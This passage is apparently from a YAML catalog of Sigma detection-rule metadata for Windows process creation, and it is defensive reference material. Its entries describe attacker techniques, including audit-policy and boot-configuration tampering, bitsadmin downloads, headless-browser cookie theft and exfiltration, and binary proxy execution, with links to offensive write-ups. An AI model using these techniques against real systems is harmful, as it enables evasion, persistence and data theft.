  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_auditpol_nt_resource_kit_usage.yml
  name: Audit Policy Tampering Via NT Resource Kit Auditpol
  description: 'Threat actors can use an older version of the auditpol binary available
    inside the NT resource kit to change audit policy configuration to impair detection
    capability.

    This can be carried out by selectively disabling/removing certain audit policies
    as well as restoring a custom policy owned by the threat actor.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.002
  tags:
  - attack.defense-evasion
  - attack.t1562.002
  time_window: ''
  references:
  - https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Windows%202000%20Resource%20Kit%20Tools/AuditPol
  false_positives:
  - The old auditpol utility isn't available by default on recent versions of Windows
    as it was replaced by a newer version. The FP rate should be very low except for
    tools that use a similar flag structure
  notes: ''
- detection_id: 0a13e132-651d-11eb-ae93-0242ac130002
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_auditpol_susp_execution.yml
  name: Audit Policy Tampering Via Auditpol
  description: 'Threat actors can use auditpol binary to change audit policy configuration
    to impair detection capability.

    This can be carried out by selectively disabling/removing certain audit policies
    as well as restoring a custom policy owned by the threat actor.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.002
  tags:
  - attack.defense-evasion
  - attack.t1562.002
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/
  false_positives:
  - Administrator or administrator scripts might leverage the flags mentioned in the
    detection section. Either way, it should always be monitored
  notes: ''
- detection_id: c80e66d8-1780-48a9-b412-46663fd21ac0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_autorun_registry_modified_via_wmic.yml
  name: Suspicious Autorun Registry Modified via WMI
  description: 'Detects suspicious activity where the WMIC process is used to create
    an autorun registry entry via reg.exe, which is often indicative of persistence
    mechanisms employed by malware.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1047
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.t1547.001
  - attack.t1047
  time_window: ''
  references:
  - Internal Research
  - https://github.com/HackTricks-wiki/hacktricks/blob/e4c7b21b8f36c97c35b7c622732b38a189ce18f7/src/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.md
  false_positives:
  - Legitimate administrative activity or software installations
  notes: ''
- detection_id: 9f38c1db-e2ae-40bf-81d0-5b68f73fb512
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_baaupdate_susp_child_process.yml
  name: Suspicious BitLocker Access Agent Update Utility Execution
  description: 'Detects the execution of the BitLocker Access Agent Update Utility
    (baaupdate.exe) which is not a common parent process for other processes.

    Suspicious child processes spawned by baaupdate.exe could indicate an attempt
    at lateral movement via BitLocker DCOM & COM Hijacking.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1021.003
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  - attack.lateral-movement
  - attack.t1021.003
  time_window: ''
  references:
  - https://github.com/rtecCyberSec/BitlockMove
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5edc2273-c26f-406c-83f3-f4d948e740dd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_bash_command_execution.yml
  name: Indirect Inline Command Execution Via Bash.EXE
  description: 'Detects execution of Microsoft bash launcher with the "-c" flag.

    This can be used to potentially bypass defenses and execute Linux or Windows-based
    binaries directly via bash.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1202
  tags:
  - attack.defense-evasion
  - attack.t1202
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Bash/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2d22a514-e024-4428-9dba-41505bd63a5b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_bash_file_execution.yml
  name: Indirect Command Execution From Script File Via Bash.EXE
  description: 'Detects execution of Microsoft bash launcher without any flags to
    execute the content of a bash script directly.

    This can be used to potentially bypass defenses and execute Linux or Windows-based
    binaries directly via bash.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1202
  tags:
  - attack.defense-evasion
  - attack.t1202
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Bash/
  - https://linux.die.net/man/1/bash
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1444443e-6757-43e4-9ea4-c8fc705f79a2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_bcdedit_boot_conf_tamper.yml
  name: Boot Configuration Tampering Via Bcdedit.EXE
  description: Detects the use of the bcdedit command to tamper with the boot configuration
    data. This technique is often times used by malware or attackers as a destructive
    way before launching ransomware.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - time_window_aggregation
  - repeated_or_escalation_behavior
  severity: high
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1490
  tags:
  - attack.impact
  - attack.t1490
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1490/T1490.md
  - https://eqllib.readthedocs.io/en/latest/analytics/c4732632-9c1d-4980-9fa8-1d98c93f918e.html
  false_positives:
  - Unlikely
  notes: ''
- detection_id: c9fbe8e9-119d-40a6-9b59-dd58a5d84429
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_bcdedit_susp_execution.yml
  name: Potential Ransomware or Unauthorized MBR Tampering Via Bcdedit.EXE
  description: Detects potential malicious and unauthorized usage of bcdedit.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1070
  - T1542.003
  tags:
  - attack.defense-evasion
  - attack.t1070
  - attack.persistence
  - attack.t1542.003
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/bcdedit--set
  - https://twitter.com/malwrhunterteam/status/1372536434125512712/photo/2
  false_positives: []
  notes: ''
- detection_id: c615d676-f655-46b9-b913-78729021e5d7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_bcp_export_data.yml
  name: Data Export From MSSQL Table Via BCP.EXE
  description: 'Detects the execution of the BCP utility in order to export data from
    the database.

    Attackers were seen saving their malware to a database column or table and then
    later extracting it via "bcp.exe" into a file.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Exfiltration
  techniques:
  - T1048
  tags:
  - attack.execution
  - attack.exfiltration
  - attack.t1048
  time_window: ''
  references:
  - https://docs.microsoft.com/en-us/sql/tools/bcp-utility
  - https://asec.ahnlab.com/en/61000/
  - https://asec.ahnlab.com/en/78944/
  - https://www.huntress.com/blog/attacking-mssql-servers
  - https://www.huntress.com/blog/attacking-mssql-servers-pt-ii
  - https://news.sophos.com/en-us/2024/08/07/sophos-mdr-hunt-tracks-mimic-ransomware-campaign-against-organizations-in-india/
  - https://research.nccgroup.com/2018/03/10/apt15-is-alive-and-strong-an-analysis-of-royalcli-and-royaldns/
  false_positives:
  - Legitimate data export operations.
  notes: ''
- detection_id: 811f459f-9231-45d4-959a-0266c6311987
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_bginfo_suspicious_child_process.yml
  name: Suspicious Child Process Of BgInfo.EXE
  description: Detects suspicious child processes of "BgInfo.exe" which could be a
    sign of potential abuse of the binary to proxy execution via external VBScript
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.005
  - T1202
  - T1218
  tags:
  - attack.execution
  - attack.t1059.005
  - attack.defense-evasion
  - attack.t1218
  - attack.t1202
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Bginfo/
  - https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/
  false_positives:
  - Unknown
  notes: ''
- detection_id: aaf46cdc-934e-4284-b329-34aa701e3771
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_bginfo_uncommon_child_process.yml
  name: Uncommon Child Process Of BgInfo.EXE
  description: Detects uncommon child processes of "BgInfo.exe" which could be a sign
    of potential abuse of the binary to proxy execution via external VBScript
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.005
  - T1202
  - T1218
  tags:
  - attack.execution
  - attack.t1059.005
  - attack.defense-evasion
  - attack.t1218
  - attack.t1202
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Bginfo/
  - https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7f2376f9-42ee-4dfc-9360-fecff9a88fc8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_bitlockertogo_execution.yml
  name: BitLockerTogo.EXE Execution
  description: 'Detects the execution of "BitLockerToGo.EXE".

    BitLocker To Go is BitLocker Drive Encryption on removable data drives. This feature
    includes the encryption of, USB flash drives, SD cards, External hard disk drives,
    Other drives that are formatted by using the NTFS, FAT16, FAT32, or exFAT file
    system.

    This is a rarely used application and usage of it at all is worth investigating.

    Malware such as Lumma stealer has been seen using this process as a target for
    process hollowing.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://tria.ge/240521-ynezpagf56/behavioral1
  - https://any.run/report/6eea2773c1b4b5c6fb7c142933e220c96f9a4ec89055bf0cf54accdcde7df535/a407f006-ee45-420d-b576-f259094df091
  - https://bazaar.abuse.ch/sample/8c75f8e94486f5bbf461505823f5779f328c5b37f1387c18791e0c21f3fdd576/
  - https://bazaar.abuse.ch/sample/64e6605496919cd76554915cbed88e56fdec10dec6523918a631754664b8c8d3/
  false_positives:
  - Legitimate usage of BitLockerToGo.exe to encrypt portable devices.
  notes: ''
- detection_id: d059842b-6b9d-4ed1-b5c3-5b89143c6ede
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_bitsadmin_download.yml
  name: File Download Via Bitsadmin
  description: Detects usage of bitsadmin downloading a file
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1036.003
  - T1197
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.t1197
  - attack.s0190
  - attack.t1036.003
  time_window: ''
  references:
  - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin
  - https://isc.sans.edu/diary/22264
  - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/
  false_positives:
  - Some legitimate apps use this, but limited.
  notes: ''
- detection_id: 99c840f2-2012-46fd-9141-c761987550ef
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_bitsadmin_download_direct_ip.yml
  name: Suspicious Download From Direct IP Via Bitsadmin
  description: Detects usage of bitsadmin downloading a file using an URL that contains
    an IP
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1036.003
  - T1197
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.t1197
  - attack.s0190
  - attack.t1036.003
  time_window: ''
  references:
  - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin
  - https://isc.sans.edu/diary/22264
  - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/
  - https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8518ed3d-f7c9-4601-a26c-f361a4256a0c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_bitsadmin_download_file_sharing_domains.yml
  name: Suspicious Download From File-Sharing Website Via Bitsadmin
  description: Detects usage of bitsadmin downloading a file from a suspicious domain
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1036.003
  - T1197
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.t1197
  - attack.s0190
  - attack.t1036.003
  time_window: ''
  references:
  - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin
  - https://isc.sans.edu/diary/22264
  - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/
  - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ransomware-hive-conti-avoslocker
  - https://www.cisa.gov/uscert/ncas/alerts/aa22-321a
  - https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/
  false_positives:
  - Some legitimate apps use this, but limited.
  notes: ''
- detection_id: 5b80a791-ad9b-4b75-bcc1-ad4e1e89c200
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_bitsadmin_download_susp_extensions.yml
  name: File With Suspicious Extension Downloaded Via Bitsadmin
  description: Detects usage of bitsadmin downloading a file with a suspicious extension
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1036.003
  - T1197
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.t1197
  - attack.s0190
  - attack.t1036.003
  time_window: ''
  references:
  - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin
  - https://isc.sans.edu/diary/22264
  - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2ddef153-167b-4e89-86b6-757a9e65dcac
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_bitsadmin_download_susp_targetfolder.yml
  name: File Download Via Bitsadmin To A Suspicious Target Folder
  description: Detects usage of bitsadmin downloading a file to a suspicious target
    folder
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1036.003
  - T1197
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.t1197
  - attack.s0190
  - attack.t1036.003
  time_window: ''
  references:
  - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin
  - https://isc.sans.edu/diary/22264
  - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/
  - https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6e30c82f-a9f8-4aab-b79c-7c12bce6f248
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_bitsadmin_download_uncommon_targetfolder.yml
  name: File Download Via Bitsadmin To An Uncommon Target Folder
  description: Detects usage of bitsadmin downloading a file to uncommon target folder
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1036.003
  - T1197
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.t1197
  - attack.s0190
  - attack.t1036.003
  time_window: ''
  references:
  - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin
  - https://isc.sans.edu/diary/22264
  - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/
  - https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/
  false_positives:
  - Unknown
  notes: ''
- detection_id: b9cbbc17-d00d-4e3d-a827-b06d03d2380d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_bitsadmin_potential_persistence.yml
  name: Monitoring For Persistence Via BITS
  description: 'BITS will allow you to schedule a command to execute after a successful
    download to notify you that the job is finished.

    When the job runs on the system the command specified in the BITS job will be
    executed.

    This can be abused by actors to create a backdoor within the system and for persistence.

    It will be chained in a BITS job to schedule the download of malware/additional
    binaries and execute the program after being downloaded.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1197
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1197
  time_window: ''
  references:
  - https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html
  - http://0xthem.blogspot.com/2014/03/t-emporal-persistence-with-and-schtasks.html
  - https://isc.sans.edu/diary/Wipe+the+drive+Stealthy+Malware+Persistence+Mechanism+-+Part+1/15394
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3e8207c5-fcd2-4ea6-9418-15d45b4890e4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_browsers_chromium_headless_debugging.yml
  name: Potential Data Stealing Via Chromium Headless Debugging
  description: Detects chromium based browsers starting in headless and debugging
    mode and pointing to a user profile. This could be a sign of data stealing or
    remote control
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1185
  - T1564.003
  tags:
  - attack.defense-evasion
  - attack.credential-access
  - attack.collection
  - attack.t1185
  - attack.t1564.003
  time_window: ''
  references:
  - https://github.com/defaultnamehere/cookie_crimes/
  - https://mango.pdf.zone/stealing-chrome-cookies-without-a-password
  - https://embracethered.com/blog/posts/2020/cookie-crimes-on-mirosoft-edge/
  - https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/
  false_positives:
  - Unknown
  notes: ''
- detection_id: ef9dcfed-690c-4c5d-a9d1-482cd422225c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_browsers_chromium_headless_exec.yml
  name: Browser Execution In Headless Mode
  description: Detects execution of Chromium based browser in headless mode
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  - T1564.003
  tags:
  - attack.defense-evasion
  - attack.command-and-control
  - attack.t1105
  - attack.t1564.003
  time_window: ''
  references:
  - https://twitter.com/mrd0x/status/1478234484881436672?s=12
  - https://www.trendmicro.com/en_us/research/23/e/managed-xdr-investigation-of-ducktail-in-trend-micro-vision-one.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0e8cfe08-02c9-4815-a2f8-0d157b7ed33e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_browsers_chromium_headless_file_download.yml
  name: File Download with Headless Browser
  description: Detects execution of chromium based browser in headless mode using
    the "dump-dom" command line to download files
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  - T1564.003
  tags:
  - attack.defense-evasion
  - attack.command-and-control
  - attack.t1105
  - attack.t1564.003
  time_window: ''
  references:
  - https://twitter.com/mrd0x/status/1478234484881436672?s=12
  - https://www.trendmicro.com/en_us/research/23/e/managed-xdr-investigation-of-ducktail-in-trend-micro-vision-one.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 88d6e60c-759d-4ac1-a447-c0f1466c2d21
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_browsers_chromium_load_extension.yml
  name: Chromium Browser Instance Executed With Custom Extension
  description: Detects a Chromium based browser process with the 'load-extension'
    flag to start a instance with a custom extension
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1176.001
  tags:
  - attack.persistence
  - attack.t1176.001
  time_window: ''
  references:
  - https://redcanary.com/blog/chromeloader/
  - https://emkc.org/s/RJjuLa
  - https://www.mandiant.com/resources/blog/lnk-between-browsers
  false_positives:
  - Usage of Chrome Extensions in testing tools such as BurpSuite will trigger this
    alert
  notes: ''
- detection_id: 1c526788-0abe-4713-862f-b520da5e5316
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_browsers_chromium_mockbin_abuse.yml
  name: Chromium Browser Headless Execution To Mockbin Like Site
  description: Detects the execution of a Chromium based browser process with the
    "headless" flag and a URL pointing to the mockbin.org service (which can be used
    to exfiltrate data).
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://www.zscaler.com/blogs/security-research/steal-it-campaign
  false_positives:
  - Unknown
  notes: ''
- detection_id: 27ba3207-dd30-4812-abbf-5d20c57d474e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_browsers_chromium_susp_load_extension.yml
  name: Suspicious Chromium Browser Instance Executed With Custom Extension
  description: Detects a suspicious process spawning a Chromium based browser process
    with the 'load-extension' flag to start an instance with a custom extension
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1176.001
  tags:
  - attack.persistence
  - attack.t1176.001
  time_window: ''
  references:
  - https://redcanary.com/blog/chromeloader/
  - https://emkc.org/s/RJjuLa
  - https://www.mandiant.com/resources/blog/lnk-between-browsers
  false_positives:
  - Unknown
  notes: ''
- detection_id: 94771a71-ba41-4b6e-a757-b531372eaab6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_browsers_inline_file_download.yml
  name: File Download From Browser Process Via Inline URL
  description: Detects execution of a browser process with a URL argument pointing
    to a file with a potentially interesting extension. This can be abused to download
    arbitrary files or to hide from the user for example by launching the browser
    in a minimized state.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://twitter.com/mrd0x/status/1478116126005641220
  - https://lolbas-project.github.io/lolbas/Binaries/Msedge/
  false_positives:
  - Unknown
  notes: ''
- detection_id: b3d34dc5-2efd-4ae3-845f-8ec14921f449
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_browsers_remote_debugging.yml
  name: Browser Started with Remote Debugging
  description: Detects browsers starting with the remote debugging flags. Which is
    a technique often used to perform browser injection attacks
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1185
  tags:
  - attack.credential-access
  - attack.collection
  - attack.t1185
  time_window: ''
  references:
  - https://yoroi.company/wp-content/uploads/2022/05/EternityGroup_report_compressed.pdf
  - https://www.mdsec.co.uk/2022/10/analysing-lastpass-part-1/
  - https://github.com/defaultnamehere/cookie_crimes/
  - https://github.com/wunderwuzzi23/firefox-cookiemonster
  false_positives:
  - Unknown
  notes: ''
- detection_id: 62f7c9bf-9135-49b2-8aeb-1e54a6ecc13c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_browsers_tor_execution.yml
  name: Tor Client/Browser Execution
  description: Detects the use of Tor or Tor-Browser to connect to onion routing networks
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1090.003
  tags:
  - attack.command-and-control
  - attack.t1090.003
  time_window: ''
  references:
  - https://www.logpoint.com/en/blog/detecting-tor-use-with-logpoint/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 737e618a-a410-49b5-bec3-9e55ff7fbc15
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_calc_uncommon_exec.yml
  name: Suspicious Calculator Usage
  description: 'Detects suspicious use of ''calc.exe'' with command line parameters
    or in a suspicious directory, which is likely caused by some PoC or detection
    evasion.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036
  tags:
  - attack.defense-evasion
  - attack.t1036
  time_window: ''
  references:
  - https://twitter.com/ItsReallyNick/status/1094080242686312448
  false_positives:
  - Unknown
  notes: ''
- detection_id: b5c7395f-e501-4a08-94d4-57fe7a9da9d2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cdb_arbitrary_command_execution.yml
  name: Potential Binary Proxy Execution Via Cdb.EXE
  description: Detects usage of "cdb.exe" to launch arbitrary processes or commands
    from a debugger script file
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1106
  - T1127
  - T1218
  tags:
  - attack.execution
  - attack.t1106
  - attack.defense-evasion
  - attack.t1218
  - attack.t1127
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Cdb/
